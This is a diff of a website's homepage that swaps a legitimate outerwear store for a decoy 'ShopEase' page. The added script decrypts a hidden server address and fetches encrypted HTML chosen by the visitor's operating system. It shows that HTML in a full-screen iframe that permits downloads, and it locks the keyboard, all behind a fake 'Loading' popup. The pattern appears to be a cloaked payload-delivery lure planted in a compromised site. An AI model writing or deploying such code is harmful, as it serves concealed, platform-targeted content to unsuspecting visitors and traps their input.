@@ -1,21 +1,118 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FieldOuterPond â€” Rugged Field Jackets & Weatherproof Outerwear</title>
-  <meta name="description" content="Discover handcrafted weatherproof field jackets, waxed canvas utility coats, alpine waterproof shells, and heavy-duty insulated winter parkas.">
-  <link rel="canonical" href="https://fieldouterpond.com/">
-  
-  <!-- Open Graph -->
-  <meta property="og:title" content="FieldOuterPond â€” Rugged Field Jackets & Outerwear">
-  <meta property="og:description" content="Handcrafted weatherproof field jackets, waxed canvas coats, and alpine stormproof shells.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://fieldouterpond.com/">
-  <meta property="og:image" content="https://fieldouterpond.com/images/hero-field-jacket.jpg">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  <!-- Stylesheet -->
-  <link rel="stylesheet" href="style.css">
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
 
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
@@ -23,426 +120,193 @@
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <div class="reading-progress-bar" aria-hidden="true"></div>
-
-  <!-- Announcement Bar -->
-  <aside class="top-bar">
-    <div class="container top-bar-inner">
-      <span>ðŸ§¥ FieldOuterPond Atelier â€” Handcrafted weatherproof field jackets, waxed canvas coats & alpine shells.</span>
-      <div class="top-contact">
-        <span>ðŸ“ 181 Mercer Street, New York, NY 10012</span>
-        <a href="tel:+18887775845">ðŸ“ž +1-888-777-5845</a>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </aside>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- Fixed Luxury Header -->
-  <header class="site-header">
-    <div class="container">
-      <div class="nav-wrapper">
-        <a href="index.php" class="brand-logo" aria-label="FieldOuterPond Home">
-          <div class="logo-badge">ðŸ§¥</div>
-          <div class="brand-title-group">
-            <span class="brand-name">FieldOuterPond</span>
-            <span class="brand-sub">Weatherproof Field Jackets</span>
-          </div>
-        </a>
-
-        <nav class="nav-menu" aria-label="Primary Navigation">
-          <a href="index.php" class="nav-link active">Atelier</a>
-          <a href="about.html" class="nav-link">Craft</a>
-          <a href="blog.html" class="nav-link">Journal</a>
-          <a href="#weather-configurator" class="nav-link">Weather Config</a>
-          <a href="contact.html" class="nav-link">Concierge</a>
-        </nav>
-
-        <div class="nav-actions">
-          <button class="theme-toggle-btn" aria-label="Toggle Lighting Theme" title="Toggle Theme">ðŸ§¥</button>
-          <a href="contact.html" class="btn btn-gold" style="padding: 0.55rem 1.15rem; font-size: 0.82rem;">Inquire Atelier</a>
-          <button class="mobile-toggle" aria-label="Open Mobile Menu">â˜°</button>
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-    </div>
-  </header>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-  <main id="main-content">
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-    <!-- Hero Section -->
-    <section class="hero-section">
-      <div class="container">
-        <div class="hero-grid">
-          <div>
-            <span class="hero-eyebrow">ðŸ§¥ Weatherproof Outerwear Guild</span>
-            <h1 class="hero-title">Built for the Wild. Tailored for Lifelong Resilience.</h1>
-            <p class="hero-lead">
-              FieldOuterPond handcrafts rugged field jackets, heavy-duty waxed canvas utility coats, and expedition stormproof hardshells. Built to withstand torrential pond downpours, biting mountain gale winds, and decades of relentless backcountry exploration.
-            </p>
-            <div class="hero-btn-group">
-              <a href="#weather-configurator" class="btn btn-gold">Configure Outerwear</a>
-              <a href="blog.html" class="btn btn-outline">Explore Field Journal</a>
-            </div>
-            <div class="hero-stats-row">
-              <div class="stat-item">
-                <h4>12 oz</h4>
-                <p>Martexin Waxed Duck Sailcloth</p>
-              </div>
-              <div class="stat-item">
-                <h4>28,000 mm</h4>
-                <p>Hydrostatic Stormproof Head</p>
-              </div>
-              <div class="stat-item">
-                <h4>100%</h4>
-                <p>Solid Brass Riveted Hardware</p>
-              </div>
-            </div>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-
-          <div>
-            <div class="hero-card-media">
-              <img src="images/hero-field-jacket.jpg" alt="Rugged waxed canvas field jacket worn in misty outdoor wilderness" width="1200" height="800">
-              <div class="hero-card-badge">
-                <p>"A true field jacket is not disposable fashionâ€”it is personal armor against torrential storms, developing richer character with every mountain traversed."</p>
-                <span>â€” FieldOuterPond Master Outfitter</span>
-              </div>
-            </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- Interactive Field Jacket Weather & Insulation Tool -->
-    <section id="weather-configurator" class="tool-section">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-eyebrow">Outerwear Thermal Engine</span>
-          <h2 class="section-title">Field Jacket Weather & Insulation Configurator</h2>
-          <p class="section-subtitle">Simulate ambient mountain temperatures, wind chill, and storm severity to identify your optimal jacket membrane and insulation rating.</p>
-        </div>
-
-        <div class="dial-tool-card">
-          <div class="dial-slider-group">
-            <div class="slider-control">
-              <label for="jacket-temp-slider">
-                <span>Ambient Mountain Temperature</span>
-                <span id="jacket-temp-val" style="color: var(--accent-gold); font-family: var(--font-mono);">30Â°F (-1Â°C) Ambient Temp</span>
-              </label>
-              <input type="range" id="jacket-temp-slider" min="-20" max="65" step="5" value="30" aria-label="Temperature Slider">
-            </div>
-
-            <div class="slider-control">
-              <label for="jacket-storm-slider">
-                <span>Precipitation & Wind Severity</span>
-                <span id="jacket-storm-val" style="color: var(--accent-gold); font-family: var(--font-mono);">Highland Fog & Light Drizzle</span>
-              </label>
-              <input type="range" id="jacket-storm-slider" min="0" max="3" step="1" value="1" aria-label="Storm Severity Slider">
-            </div>
-          </div>
-
-          <div class="dial-result-grid">
-            <div class="result-box">
-              <h4>Recommended Shell Membrane</h4>
-              <p id="calc-membrane">12oz Traditional Martexin Waxed Cotton</p>
-            </div>
-
-            <div class="result-box">
-              <h4>Core Thermal Insulation</h4>
-              <p id="calc-insulation">100g PrimaLoft Gold Synthetic Insulation</p>
-            </div>
-
-            <div class="result-box">
-              <h4>Field Defense Index</h4>
-              <p id="calc-weather-rating">87.0/100 Field Defense Index</p>
-            </div>
-          </div>
-
-          <div style="margin-top: 1.5rem; padding: 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); font-size: 0.92rem; color: var(--text-muted);">
-            <strong>Storm-Tested Seam Sealing:</strong> All our technical shells feature ultrasonic seam taping with 3-ply GORE-SEAM tape, ensuring zero water penetration even when standing under continuous alpine waterfalls.
-          </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
     </section>
 
-    <!-- Three Pillars Section -->
-    <section class="pillars-section">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-eyebrow">Our Outerwear Philosophy</span>
-          <h2 class="section-title">The Three Pillars of FieldOuterPond Jackets</h2>
-          <p class="section-subtitle">Blending heritage sailcloth durability, modern microporous membranes, and lifetime repairable construction.</p>
-        </div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-        <div class="pillars-grid">
-          <div class="pillar-card">
-            <div class="pillar-icon-wrapper">ðŸ›¡ï¸</div>
-            <h3>1. Heavyweight Waxed Sailcloth</h3>
-            <p>12-ounce high-density cotton duck infused with natural beeswax and paraffin, providing windproof, thorn-proof, and water-repellent armor that develops a distinctive vintage patina.</p>
-            <a href="about.html" class="pillar-link">Discover Sailcloth &rarr;</a>
-          </div>
 
-          <div class="pillar-card">
-            <div class="pillar-icon-wrapper">ðŸŒ§ï¸</div>
-            <h3>2. 28,000mm Storm Membranes</h3>
-            <p>3-layer microporous ePTFE membranes allow billions of perspiration vapor molecules to escape while permanently blocking driven rain and alpine gale-force winds.</p>
-            <a href="about.html" class="pillar-link">Explore Membranes &rarr;</a>
-          </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-          <div class="pillar-card">
-            <div class="pillar-icon-wrapper">âš™ï¸</div>
-            <h3>3. Solid Brass & Double-Needle Build</h3>
-            <p>Antiqued solid brass YKK #10 zippers, storm flap horn buttons, reinforced copper pocket rivets, and heavy bonded nylon double-needle stitching for generational durability.</p>
-            <a href="about.html" class="pillar-link">Learn Craftsmanship &rarr;</a>
-          </div>
-        </div>
-      </div>
-    </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19zuvqNStdWqLITaXcTbzzMIVzUdZfBezpGAYjWzoU4LxBTe6vV2KgX";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-    <!-- Visual Jacket Showcase Gallery -->
-    <section class="tool-section" style="background: var(--bg-surface-alt); padding: 5rem 0;">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-eyebrow">Outerwear Collection</span>
-          <h2 class="section-title">The FieldOuterPond Master Jacket Collection</h2>
-          <p class="section-subtitle">Engineered for mountain ridge traverses, heavy rains, deep winter blizzards, and rugged backcountry chores.</p>
-        </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-        <div class="pillars-grid">
-          <div style="background: var(--bg-surface); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-sm);">
-            <div style="height: 250px; overflow: hidden;">
-              <img src="images/feature-waterproof-shell.jpg" alt="Stormproof technical mountain shell jacket with waterproof zippers" style="width: 100%; height: 100%; object-fit: cover;">
-            </div>
-            <div style="padding: 1.5rem;">
-              <h3 style="font-size: 1.2rem; margin-bottom: 0.5rem; color: var(--text-main);">The Alpine Pond Storm Hardshell</h3>
-              <p style="font-size: 0.9rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0;">3-layer 28,000mm waterproof shell with pit zips, helmet-compatible hood, and welded storm flap pockets for extreme alpine rainstorms.</p>
-            </div>
-          </div>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-          <div style="background: var(--bg-surface); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-sm);">
-            <div style="height: 250px; overflow: hidden;">
-              <img src="images/feature-insulated-parka.jpg" alt="Warm winter down-insulated mountain parka in freezing winter climate" style="width: 100%; height: 100%; object-fit: cover;">
-            </div>
-            <div style="padding: 1.5rem;">
-              <h3 style="font-size: 1.2rem; margin-bottom: 0.5rem; color: var(--text-main);">The Sub-Zero Expedition Down Parka</h3>
-              <p style="font-size: 0.9rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0;">800-fill power RDS European goose down encased in ripstop weather-resistant shell with fleece-lined handwarmer pockets for sub-zero cold.</p>
-            </div>
-          </div>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-          <div style="background: var(--bg-surface); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-sm);">
-            <div style="height: 250px; overflow: hidden;">
-              <img src="images/feature-field-chore-coat.jpg" alt="Rugged utility canvas field chore coat with reinforced collar and brass buttons" style="width: 100%; height: 100%; object-fit: cover;">
-            </div>
-            <div style="padding: 1.5rem;">
-              <h3 style="font-size: 1.2rem; margin-bottom: 0.5rem; color: var(--text-main);">The Highland Waxed Field Chore Coat</h3>
-              <p style="font-size: 0.9rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0;">Heavyweight 12oz waxed duck canvas chore jacket featuring corduroy collar, interior game pocket, and reinforced elbow patches.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-    <!-- 4-Stage Outerwear Construction Lifecycle -->
-    <section class="tool-section" style="background: var(--bg-surface);">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-eyebrow">Fabrication Standards</span>
-          <h2 class="section-title">The Four Stages of Field Jacket Construction</h2>
-          <p class="section-subtitle">From raw heavy-twist organic cotton duck to storm-chamber testing.</p>
-        </div>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-        <div class="pillars-grid" style="grid-template-columns: repeat(4, 1fr); gap: 1.5rem;">
-          <div class="pillar-card">
-            <div class="pillar-icon-wrapper">1ï¸âƒ£</div>
-            <h3 style="font-size: 1.15rem;">Sailcloth Weaving</h3>
-            <p style="font-size: 0.88rem;">Weaving high-twist long-staple cotton into 12oz military-spec duck canvas with dense warp and weft counts for maximum puncture resistance.</p>
-          </div>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-          <div class="pillar-card">
-            <div class="pillar-icon-wrapper">2ï¸âƒ£</div>
-            <h3 style="font-size: 1.15rem;">Wax Infusion</h3>
-            <p style="font-size: 0.88rem;">Deep hot-roller pressure impregnation of custom handcrafted beeswax and paraffin blends deep into the yarn core, achieving lifetime water repellency.</p>
-          </div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-          <div class="pillar-card">
-            <div class="pillar-icon-wrapper">3ï¸âƒ£</div>
-            <h3 style="font-size: 1.15rem;">Articulated Cutting</h3>
-            <p style="font-size: 0.88rem;">Precision cutting with anatomical shoulder gussets and bi-swing back pleats, allowing full range of arm motion without jacket ride-up.</p>
-          </div>
-
-          <div class="pillar-card">
-            <div class="pillar-icon-wrapper">4ï¸âƒ£</div>
-            <h3 style="font-size: 1.15rem;">Storm Verification</h3>
-            <p style="font-size: 0.88rem;">Each production prototype undergoes 4 hours in our simulated hurricane rain chamber with 40-knot winds to guarantee zero moisture ingress.</p>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Jacket Fabric & Hydrostatic Head Matrix -->
-    <section class="tool-section" style="background: var(--bg-surface-alt);">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-eyebrow">Technical Performance Matrix</span>
-          <h2 class="section-title">FieldOuterPond Fabric & Membrane Matrix</h2>
-          <p class="section-subtitle">Compare hydrostatic head ratings, breathability scores, and fabric weights across our jackets.</p>
-        </div>
-
-        <div style="background: var(--bg-surface); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); overflow-x: auto; box-shadow: var(--shadow-sm); padding: 1.5rem;">
-          <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.92rem;">
-            <thead>
-              <tr style="border-bottom: 2px solid var(--border-subtle); color: var(--accent-gold);">
-                <th style="padding: 1rem; font-family: var(--font-mono); font-size: 0.82rem; text-transform: uppercase;">Jacket Model</th>
-                <th style="padding: 1rem; font-family: var(--font-mono); font-size: 0.82rem; text-transform: uppercase;">Shell Material</th>
-                <th style="padding: 1rem; font-family: var(--font-mono); font-size: 0.82rem; text-transform: uppercase;">Waterproof Rating</th>
-                <th style="padding: 1rem; font-family: var(--font-mono); font-size: 0.82rem; text-transform: uppercase;">Breathability (MVTR)</th>
-                <th style="padding: 1rem; font-family: var(--font-mono); font-size: 0.82rem; text-transform: uppercase;">Optimal Climate</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr style="border-bottom: 1px solid var(--border-subtle);">
-                <td style="padding: 1rem; font-weight: 700;">Alpine Storm Hardshell</td>
-                <td style="padding: 1rem; color: var(--text-muted);">3-Layer 70D Ripstop Nylon</td>
-                <td style="padding: 1rem; color: var(--text-muted);">28,000 mm Hydrostatic Head</td>
-                <td style="padding: 1rem; color: var(--text-muted);">20,000 g/mÂ²/24hr</td>
-                <td style="padding: 1rem; color: var(--text-muted);">Heavy rain, mountain ascents, and high-aerobic trekking</td>
-              </tr>
-              <tr style="border-bottom: 1px solid var(--border-subtle);">
-                <td style="padding: 1rem; font-weight: 700;">Highland Waxed Field Coat</td>
-                <td style="padding: 1rem; color: var(--text-muted);">12oz Martexin Waxed Duck Cotton</td>
-                <td style="padding: 1rem; color: var(--text-muted);">12,000 mm Water Repellency</td>
-                <td style="padding: 1rem; color: var(--text-muted);">14,000 g/mÂ²/24hr (Natural)</td>
-                <td style="padding: 1rem; color: var(--text-muted);">Bushcraft, forest trekking, windstorms, and everyday field wear</td>
-              </tr>
-              <tr style="border-bottom: 1px solid var(--border-subtle);">
-                <td style="padding: 1rem; font-weight: 700;">Sub-Zero Expedition Parka</td>
-                <td style="padding: 1rem; color: var(--text-muted);">800-Fill Goose Down + DWR Cordura</td>
-                <td style="padding: 1rem; color: var(--text-muted);">20,000 mm Storm Barrier</td>
-                <td style="padding: 1rem; color: var(--text-muted);">15,000 g/mÂ²/24hr</td>
-                <td style="padding: 1rem; color: var(--text-muted);">Sub-zero winter blizzards, Arctic travel, and alpine base camps</td>
-              </tr>
-              <tr>
-                <td style="padding: 1rem; font-weight: 700;">Heritage Chore Utility Jacket</td>
-                <td style="padding: 1rem; color: var(--text-muted);">10oz Unwaxed Heavy Duck Canvas</td>
-                <td style="padding: 1rem; color: var(--text-muted);">DWR Wind-Resistant 5,000 mm</td>
-                <td style="padding: 1rem; color: var(--text-muted);">25,000 g/mÂ²/24hr (Max Airflow)</td>
-                <td style="padding: 1rem; color: var(--text-muted);">Mild spring/autumn chores, workshop, and campfire evenings</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div style="text-align: center; margin-top: 3rem;">
-          <a href="about.html" class="btn btn-gold">Discover Our Outerwear Heritage</a>
-          <a href="blog.html" class="btn btn-outline" style="margin-left: 0.75rem;">Explore Full Field Journal</a>
-        </div>
-      </div>
-    </section>
-
-    <!-- FAQ Section -->
-    <section class="pillars-section" style="background: var(--bg-surface);">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-eyebrow">Outfitter Advice</span>
-          <h2 class="section-title">Waxed Jacket Care & Waterproofing FAQ</h2>
-          <p class="section-subtitle">Guidance on wax re-proofing, membrane cleaning, and jacket fit.</p>
-        </div>
-
-        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 1.5rem; max-width: 1040px; margin: 0 auto;">
-          <div style="background: var(--bg-surface-alt); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); padding: 1.75rem;">
-            <h4 style="font-size: 1.05rem; color: var(--accent-gold); margin-bottom: 0.5rem;">How often should I re-proof my waxed canvas field jacket?</h4>
-            <p style="font-size: 0.92rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0;">Under normal seasonal use, applying a fresh coat of paraffin/beeswax dressing once a year (or whenever water stops beading on high-friction shoulders and sleeve creases) restores 100% water repellency and enhances the canvas patina.</p>
-          </div>
-
-          <div style="background: var(--bg-surface-alt); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); padding: 1.75rem;">
-            <h4 style="font-size: 1.05rem; color: var(--accent-gold); margin-bottom: 0.5rem;">Can I machine wash a waxed canvas jacket?</h4>
-            <p style="font-size: 0.92rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0;">Never machine wash, dry clean, or use hot water on a waxed jacket, as detergents strip the protective wax barrier permanently. Simply wipe off dried mud with a cold water damp sponge and stiff bristle brush.</p>
-          </div>
-
-          <div style="background: var(--bg-surface-alt); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); padding: 1.75rem;">
-            <h4 style="font-size: 1.05rem; color: var(--accent-gold); margin-bottom: 0.5rem;">What makes 3-layer hardshell jackets superior to 2.5-layer shells?</h4>
-            <p style="font-size: 0.92rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0;">A 3-layer jacket bonds a durable outer face fabric, the waterproof membrane, and a smooth internal tricot backer into a unified laminate. This protects the membrane from skin body oils and sweat salts, tripling the jacket's operational lifespan under heavy backpack straps.</p>
-          </div>
-
-          <div style="background: var(--bg-surface-alt); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); padding: 1.75rem;">
-            <h4 style="font-size: 1.05rem; color: var(--accent-gold); margin-bottom: 0.5rem;">How should I layer under my FieldOuterPond jacket for winter?</h4>
